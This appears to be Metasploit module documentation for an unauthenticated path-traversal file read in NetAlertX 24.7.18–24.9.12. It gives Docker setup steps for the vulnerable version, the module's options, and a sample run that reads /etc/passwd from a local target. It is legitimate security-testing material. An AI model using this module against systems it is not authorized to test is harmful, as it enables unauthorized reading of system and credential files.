## Vulnerable Application


An attacker can read any file through log functionality with no authentication.

The vulnerability affects:

    * v24.7.18 <= NetAlertX <= v24.9.12

## Verification Steps

### Installation

1. `docker pull jokobsk/netalertx:24.9.12`

2. docker run
```bash
docker run --rm --network=host \
  -v /tmp/netalertx:/app/config \
  -v /tmp/netalertx:/app/db \
  -e TZ=Europe/Berlin \
  -e PORT=20211 \
  jokobsk/netalertx:24.9.12
```

### Verification

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/netalertx_file_read`
4. Do: `run rhost=<rhost>`
5. You should get the contents of the specified file.

## Options

- `RHOSTS`: target host
- `RPORT`: target port, default 20211
- `FILEPATH`: path to the required file
- `DEPTH`: number of `../` to be prepended to `FILEPATH`

## Scenarios

```
msf6 > use auxiliary/scanner/http/netalertx_file_read 
msf6 auxiliary(scanner/http/netalertx_file_read) > show options

Module options (auxiliary/scanner/http/netalertx_file_read):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DEPTH     5                yes       Traversal Depth (to reach the root folder)
   FILEPATH  /etc/passwd      yes       The path to the file to read
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
                                        tml
   RPORT     20211            yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                yes       The number of concurrent threads (max one per host)
   VHOST                      no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/netalertx_file_read) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(scanner/http/netalertx_file_read) > run
[*] Received data:
[*] root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
catchlog:x:100:101:catchlog:/:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin

[*] Stored results in netalert_result.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/netalertx_file_read) > 


```


